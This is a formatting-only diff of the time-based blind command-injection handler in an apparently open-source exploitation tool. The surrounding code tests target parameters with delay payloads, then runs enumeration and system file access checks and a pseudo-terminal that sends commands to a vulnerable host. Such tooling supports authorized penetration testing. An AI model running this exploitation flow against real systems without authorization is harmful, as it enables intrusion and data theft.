@@ -41,7 +41,7 @@ from src.core.injections.blind_based.techniques.time_based import tb_file_access
 #-------------------------------------------------
 # The "time-based" injection technique handler.
 #-------------------------------------------------
-def tb_injection_handler(url,delay,filename,http_request_method):
+def tb_injection_handler(url, delay, filename, http_request_method):
         
   num_of_chars = 0
   counter = 0
@@ -95,15 +95,15 @@ def tb_injection_handler(url,delay,filename,http_request_method):
         TAG = ''.join(random.choice(string.ascii_uppercase) for num_of_chars in range(6))
         tag_length = len(TAG) + 4
         
-        for output_length in range(1,int(tag_length)):
+        for output_length in range(1, int(tag_length)):
           try:
             
             if alter_shell:
               # Time-based decision payload (check if host is vulnerable).
-              payload = tb_payloads.decision_alter_shell(separator,TAG,output_length,delay,http_request_method)
+              payload = tb_payloads.decision_alter_shell(separator, TAG, output_length, delay, http_request_method)
             else:
               # Time-based decision payload (check if host is vulnerable).
-              payload = tb_payloads.decision(separator,TAG,output_length,delay,http_request_method)
+              payload = tb_payloads.decision(separator, TAG, output_length, delay, http_request_method)
 
             # Check if defined "--prefix" option.
             if menu.options.prefix:
@@ -121,10 +121,10 @@ def tb_injection_handler(url,delay,filename,http_request_method):
               
             # Check if defined "--verbose" option.
             if menu.options.verbose:
-              sys.stdout.write("\n" + Fore.GREY + payload.replace("\n","\\n") + Style.RESET_ALL)
+              sys.stdout.write("\n" + Fore.GREY + payload.replace("\n", "\\n") + Style.RESET_ALL)
                 
             # Check if target host is vulnerable.
-            how_long,vuln_parameter = tb_injector.injection_test(payload,http_request_method,url)
+            how_long, vuln_parameter = tb_injector.injection_test(payload, http_request_method, url)
             if not menu.options.verbose:
               percent = ((num_of_chars*100)/total)
               if how_long >= delay:
@@ -185,7 +185,7 @@ def tb_injection_handler(url,delay,filename,http_request_method):
               print Style.BRIGHT + "\n(!) The ("+ http_request_method + ") '" + Style.UNDERLINE + GET_vuln_param + Style.RESET_ALL + Style.BRIGHT + "' parameter is vulnerable to "+ injection_type +"."+ Style.RESET_ALL
               print "  (+) Type : "+ Fore.YELLOW + Style.BRIGHT + injection_type + Style.RESET_ALL + ""
               print "  (+) Technique : "+ Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
-              print "  (+) Payload : "+ Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", urllib.unquote_plus(payload.replace("\n","\\n"))) + Style.RESET_ALL
+              print "  (+) Payload : "+ Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", urllib.unquote_plus(payload.replace("\n", "\\n"))) + Style.RESET_ALL
                 
             else :
               # Print the findings to log file
@@ -208,13 +208,13 @@ def tb_injection_handler(url,delay,filename,http_request_method):
               print Style.BRIGHT + "\n(!) The ("+ http_request_method + ") '" + Style.UNDERLINE + POST_vuln_param + Style.RESET_ALL + Style.BRIGHT + "' parameter is vulnerable to "+ injection_type +"."+ Style.RESET_ALL
               print "  (+) Type : "+ Fore.YELLOW + Style.BRIGHT + injection_type + Style.RESET_ALL + ""
               print "  (+) Technique : "+ Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
-              print "  (+) Payload : "+ Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", payload.replace("\n","\\n")) + Style.RESET_ALL
+              print "  (+) Payload : "+ Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", payload.replace("\n", "\\n")) + Style.RESET_ALL
               
             # Check for any enumeration options.
-            tb_enumeration.do_check(separator,maxlen,TAG,prefix,suffix,delay,http_request_method,url,vuln_parameter,alter_shell)
+            tb_enumeration.do_check(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell)
 
             # Check for any system file access options.
-            tb_file_access.do_check(separator,maxlen,TAG,prefix,suffix,delay,http_request_method,url,vuln_parameter,alter_shell)
+            tb_file_access.do_check(separator, maxlen, TAG, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell)
             
             # Pseudo-Terminal shell
             while True:
@@ -230,7 +230,7 @@ def tb_injection_handler(url,delay,filename,http_request_method):
                       
                     else:
                       # The main command injection exploitation.
-                      check_how_long,output  = tb_injector.injection(separator,maxlen,TAG,cmd,prefix,suffix,delay,http_request_method,url,vuln_parameter,alter_shell)
+                      check_how_long, output  = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell)
 
                     if menu.options.verbose:
                       print ""
@@ -269,8 +269,8 @@ def tb_injection_handler(url,delay,filename,http_request_method):
     sys.stdout.write("\r")
     sys.stdout.flush()
     
-def exploitation(url,delay,filename,http_request_method):
-    if tb_injection_handler(url,delay,filename,http_request_method) == False:
+def exploitation(url, delay, filename, http_request_method):
+    if tb_injection_handler(url, delay, filename, http_request_method) == False:
       return False
     
 #eof
